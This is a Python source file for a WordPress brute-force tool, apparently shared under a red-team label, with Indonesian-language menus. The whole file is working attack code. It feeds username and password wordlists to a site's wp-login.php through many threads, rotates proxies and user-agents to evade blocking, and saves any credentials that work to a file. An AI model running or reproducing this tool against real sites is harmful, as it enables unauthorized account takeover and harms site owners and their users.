# ==============================================
#  🔥 WP Brute Force Tool 🔥
#  🥷 Author   : [Red Team Exploits]
#  📌 Version  : 1.2
# ==============================================

import requests
import threading
import random
import time
import pyfiglet
from rich.console import Console
from rich.text import Text
from urllib.parse import urlparse

console = Console()

# 🔹 File wordlist
usernames_file = 'usernames.txt'
passwords_file = 'passwords.txt'

# 🔹 Daftar warna Rich
colors = ["bold red", "bold green", "bold yellow", "bold blue", "bold magenta", "bold cyan", "bold white"]

# 🔹 Banner ASCII berwarna
def print_banner():
    banner = pyfiglet.figlet_format("WP Brute Force")
    random_color = random.choice(colors)
    console.print(Text(banner, style=random_color))

# 🔹 Load wordlist
def load_wordlist(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f.readlines()]

# 🔹 Membersihkan proxy
def clean_proxies(input_file, output_file):
    with open(input_file, 'r') as infile, open(output_file, 'w') as outfile:
        for line in infile:
            proxy = line.strip()
            if ":" in proxy and not any(c in proxy for c in [" ", "!", "@"]):
                outfile.write(proxy + "\n")

# 🔹 Random User-Agent
def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) Chrome/114.0.5735.91 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) Chrome/113.0.5672.63 Safari/537.36"
    ]
    return random.choice(user_agents)

# 🔹 Format proxy
def format_proxy(proxy):
    try:
        parsed = urlparse(proxy)
        if parsed.scheme in ['http', 'https', 'socks5']:
            return proxy
        else:
            return f"http://{proxy}"
    except Exception:
        return None

# 🔹 Fungsi login
def attempt_login(url, username, password, proxy=None):
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': '1'
    }

    headers = {'User-Agent': random_user_agent()}
    proxies = {'http': proxy, 'https': proxy} if proxy else None

    try:
        session = requests.Session()
        response = session.post(url, data=data, headers=headers, proxies=proxies, timeout=10)

        if "Dashboard" in response.text or "wp-admin" in response.url:
            console.print(f"[✅ SUCCESS] {username}:{password}", style="bold green")
            with open("valid_logins.txt", "a") as f:
                f.write(f"{username}:{password}\n")
            return True
        elif "Invalid username" in response.text or "incorrect password" in response.text:
            return False
        else:
            console.print("[⚠️ INFO] Mungkin CAPTCHA atau proteksi. Cek manual!", style="bold yellow")
            return False

    except requests.exceptions.RequestException as e:
        console.print(f"[❌ ERROR] {e}", style="bold red")
        return False

# 🔹 Brute force login
def brute_force_login(url, usernames_file, passwords_file, use_proxy):
    usernames = load_wordlist(usernames_file)
    passwords = load_wordlist(passwords_file)

    if use_proxy:
        clean_proxies("proxies.txt", "proxies_clean.txt")
        proxies = load_wordlist("proxies_clean.txt")
    else:
        proxies = [None]

    def worker(username):
        for password in passwords:
            proxy = format_proxy(random.choice(proxies)) if use_proxy and proxies else None
            console.print(f"[🔍] Trying {username}:{password} (Proxy: {proxy})", style="bold blue")

            if attempt_login(url, username, password, proxy):
                console.print(f"[🎯] Login berhasil: {username}:{password}", style="bold green")
                return
            time.sleep(random.uniform(1, 3))

    threads = []
    for username in usernames:
        t = threading.Thread(target=worker, args=(username,))
        threads.append(t)
        t.start()
        time.sleep(1)

    for t in threads:
        t.join()

    console.print("[❌] Tidak ada kombinasi yang berhasil.", style="bold red")

# 🔹 Report bug
def report_bug():
    bug_desc = input("Jelaskan bug yang ditemukan: ")
    with open("results/bug_report.txt", "a") as f:
        f.write(f"Bug Report:\n{bug_desc}\n-----------------\n")
    console.print("[✔] Bug telah dicatat di results/bug_report.txt", style="bold cyan")

# 🔹 Info tool
def print_info():
    console.print("🔥 WP Brute Force Tool 🔥", style="bold cyan")
    console.print("🧑‍💻 Author   : [Red-Team-Exploit]", style="bold green")
    console.print("📌 Version  : 1.2", style="bold yellow")
    console.print("=" * 40, style="bold white")

# 🔹 Input target
def get_target_url():
    console.print("\n[🌐] Masukkan URL target WordPress (contoh: https://example.com/wp-login.php)", style="bold cyan")
    url = input("🔹 Target: ").strip()
    if not url.startswith("http"):
        console.print("[❌] URL tidak valid! Harus diawali dengan 'http://' atau 'https://'", style="bold red")
        return get_target_url()
    return url

# 🔹 Menu utama
def main_menu():
    while True:
        print_info()
        print_banner()
        console.print("[1] Jalankan Script", style="bold green")
        console.print("[2] Batalkan Script", style="bold red")
        console.print("[3] Report Bug", style="bold cyan")
        console.print("[4] Keluar", style="bold yellow")

        choice = input("\nPilih opsi (1-4): ")

        if choice == "1":
            target_url = get_target_url()
            use_proxy = input("\nGunakan proxy? (Y/N): ").lower()
            confirm = input("Apakah kamu yakin ingin menjalankan brute force? (Y/N): ").lower()
            if confirm == "y":
                console.print("\n[✔] Menjalankan brute force...\n", style="bold green")
                brute_force_login(target_url, usernames_file, passwords_file, use_proxy == "y")
            else:
                console.print("\n[❌] Operasi dibatalkan.", style="bold red")

        elif choice == "2":
            console.print("\n[❌] Script dibatalkan.\n", style="bold red")

        elif choice == "3":
            report_bug()

        elif choice == "4":
            console.print("\n[👋] Keluar dari script.\n", style="bold yellow")
            break

        else:
            console.print("\n[⚠️] Pilihan tidak valid, coba lagi.", style="bold red")

# 🔹 Jalankan menu utama
if __name__ == "__main__":
    main_menu()
